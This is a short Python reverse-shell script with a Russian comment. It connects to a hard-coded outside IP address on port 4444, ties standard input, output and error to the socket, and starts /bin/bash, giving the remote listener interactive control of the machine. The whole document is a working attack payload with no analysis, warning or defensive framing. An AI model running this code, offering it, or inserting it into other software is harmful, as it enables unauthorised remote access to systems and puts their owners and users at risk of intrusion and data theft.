import socket
import subprocess
import os

ip = "94.142.138.201"
port = 4444

s = socket.socket()
s.connect((ip, port))

os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# запускаем интерактивный shell
subprocess.call(["/bin/bash"])
